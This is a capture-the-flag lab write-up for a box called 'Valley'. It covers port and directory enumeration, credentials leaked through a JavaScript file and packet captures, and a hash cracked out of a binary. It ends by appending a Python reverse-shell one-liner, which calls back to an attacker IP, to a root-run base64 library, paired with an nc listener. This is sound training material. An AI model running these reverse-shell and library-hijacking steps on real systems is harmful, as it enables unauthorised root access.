# Valley - Easy

* Add ```valley.thm``` with target IP to ```/etc/hosts```

* ```nmap``` scan - ```nmap -T4 -p- -v -A -Pn valley.thm```:

  * 22/tcp - ssh - OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
  * 80/tcp - http - Apache httpd 2.4.41 ((Ubuntu))
  * 37370/tcp - ftp - vsftpd 3.0.3

* We can start by checking the ```ftp``` service:

  ```sh
  ftp valley.thm 37370
  # tried anonymous login, but it did not work
  ```

* The page on port 80 is for 'Valley Photo Co.' - they have a few pages that we can check. We will continue to enumerate this while we do some web enumeration in background:

  ```sh
  # directory scanning
  gobuster dir -u http://valley.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html,bak -t 25

  ffuf -c -u http://valley.thm -H "Host: FUZZ.valley.thm" -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -t 25
  # filter false positives out using -fw flag

  ffuf -c -u http://valley.thm -H "Host: FUZZ.valley.thm" -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -t 25 -fw 176

  gobuster vhost -u http://valley.thm -w /usr/share/wordlists/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt
  # no subdomains or vhosts found
  ```

* Directory scanning gives us 3 directories - '/gallery', '/static', and '/pricing'. The '/pricing' directory includes a note which mentions two usernames "J" and "RP", but we don't know who they are

* In '/static', we are not able to see any entries, so directory listing seems to be disabled, but we know that the images shown in '/gallery' are from '/static' and are named in the range 1-18 ('/static/1', '/static/2', etc.)

* We can try directory scanning '/static' since we are not able to see the directory listing for this:

  ```sh
  gobuster dir -u http://valley.thm/static -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html,bak -t 25
  ```

* This gives us an additional image named '/00'

* Navigating to <http://valley.thm/static/00> gives us a note instead of an image. From this, we get an username 'valleyDev' and a directory '/dev1243224123123'

* The directory '/dev1243224123123' leads us to a login page - we can enumerate this directory as well:

  ```sh
  gobuster dir -u http://valley.thm/dev1243224123123 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html,bak -t 25
  ```

* Checking the source code for this login page, we can see a script '/dev.js' - this gives us the functionality of the login page:

  * valid username is less than 5 characters in length
  * valid password is less than 7 characters in length
  * there is a credential pair "siemDev:california", which when entered would lead to "/dev1243224123123/devNotes37370.txt"

* Navigating to "/dev1243224123123/devNotes37370.txt" mentions credential reuse for ```ftp```. We can try the above creds:

  ```sh
  ftp valley.thm 37370
  # using creds siemDev:california

  # we are able to login
  ls
  # we have a few packet captures

  mget *
  # fetch all 3 .pcapng files
  ```

* We have fetched 3 packet captures - ```siemFTP.pcapng```, ```siemHTTP1.pcapng```, and ```siemHTTP2.pcapng``` - we can check this using ```wireshark```

* For the FTP capture, we can follow the TCP stream. This shows creds 'anonymous:anonymous' works, but no files seen. These credentials don't work for ```ftp``` currently

* For the first HTTP capture, we can use the method of filtering by ```http``` and following HTTP/TCP stream - this capture contains a test to few sample websites, nothing of much use. We can alternatively navigate to Analyze > Follow > TCP Stream

* For the second HTTP capture, if we filter by HTTP capture and follow one of the HTTP streams, we can see a POST request to a page with credentials "valleyDev:ph0t0s1234"

* We can try using these creds for the login page at "/dev1243224123123", but it does not work

* Since password reuse was mentioned earlier, we can try the above credentials with SSH as well:

  ```sh
  ssh valleyDev@valley.thm
  # it works

  id
  # valleyDev

  cat user.txt
  # get user flag

  # for enumeration, we can use linpeas.sh

  # in attacker machine, host server
  python3 -m http.server 8000

  # in victim ssh
  wget http://10.10.87.119:8000/linpeas.sh

  chmod +x linpeas.sh

  ./linpeas.sh
  ```

* ```linpeas.sh``` shows there is a cronjob running as root, we can confirm this using ```cat /etc/crontab```

* A Python script is run as root every minute - ```python3 /photos/script/photosEncrypt.py```:

  ```sh
  ls -la /photos/script/photosEncrypt.py
  # this script is not writable by us

  cat /photos/script/photosEncrypt.py
  ```

  ```py
  #!/usr/bin/python3
  import base64
  for i in range(1,7):
  # specify the path to the image file you want to encode
    image_path = "/photos/p" + str(i) + ".jpg"

  # open the image file and read its contents
    with open(image_path, "rb") as image_file:
            image_data = image_file.read()

  # encode the image data in Base64 format
    encoded_image_data = base64.b64encode(image_data)

  # specify the path to the output file
    output_path = "/photos/photoVault/p" + str(i) + ".enc"

  # write the Base64-encoded image data to the output file
    with open(output_path, "wb") as output_file:
        output_file.write(encoded_image_data)
  ```

* This script considers image path starting from '/photos/p1.jpg' and going on till '/photos/p6.jpg', opens these files in binary read mode and reads its contents into the 'image_data' variable. Then, this data is encoded in base64 and stored in similarly named files in the 'photoVault' directory

* We can try to read root flag by making our Python script think it is one of the images:

  ```sh
  cp /root/root.txt /photos/p6.jpg
  # permission denied

  # we can try creating a symbolic link
  ln -s /root/root.txt /photos/p6.jpg
  # this throws an error, since the file already exists

  ls -la /photos
  # this shows 'valley' user has rights for editing the images
  ```

* From ```ls -la /home```, we can see that there are 3 users to be checked - 'siemDev', 'valley' and 'valleyDev'. We also have a file in this directory:

  ```sh
  ls -la /home

  ls -la /home/valleyAuthenticator

  file /home/valleyAuthenticator
  # it is a 64-bit executable

  # we can try running it
  /home/valleyAuthenticator
  # this asks for a username password pair

  # we can transfer this to our machine and check its contents
  scp valleyDev@valley.thm:/home/valleyAuthenticator ~

  # in attacker machine
  strings valleyAuthenticator -n 6 > valleyStrings.txt
  # filter for strings more than 6 chars in length

  less valleyStrings.txt
  # check for any unusual strings
  ```

* The binary asks for a username-password pair; we can try both set of creds found earlier, but no luck.

* From the output of ```strings```, we are able to detect normal strings. However, there are other parts of strings like "e6722920bab2326f8217e4" and "bf6b1b58ac" seen before the login strings which is unusually long, and also because it is in hex only

* Checking from [Cipher Identifier](https://www.dcode.fr/cipher-identifier), it seems to be a MD5 hash - we can confirm this using online tools like [CrackStation](https://crackstation.net/)

* The first identified string is a MD5 hash, and cracking it gives us the password "liberty123". We can try this password with the 'valley' username we found earlier:

  ```sh
  ./valleyAuthenticator
  # enter creds 'valley:liberty123'
  # this works

  # we can SSH using same creds
  ssh valley@valley.thm

  id
  # shows that we are a part of a group named 'valleyAdmin'

  # check if this group owns any interesting files
  find / -group valleyAdmin 2>/dev/null

  # confirm the above
  ls -la /usr/lib/python3.8/base64.py
  ```

* Checking for files owned by 'valleyAdmin', it shows ```/usr/lib/python3.8/base64.py``` is owned by 'valleyAdmin', so we can make changes to this

* From the code for 'photosEncrypt.py', the Python script that we were checking earlier, it imports base64. We can take advantage of this by hijacking this Python library

* For simple library hijacking, we can add a reverse-shell one-liner at the end of our base64 library code:

  ```py
  import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.87.119",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
  ```

  ```sh
  # on attacker machine, start listener
  nc -nvlp 4444
  ```
  
  ```sh
  # in victim ssh
  nano /usr/lib/python3.8/base64.py
  # navigate to end of file
  # and add the reverse-shell one-liner
  # and save file 
  ```

* Once we add the reverse shell code and save the library, in a minute we get reverse shell on our listener as root
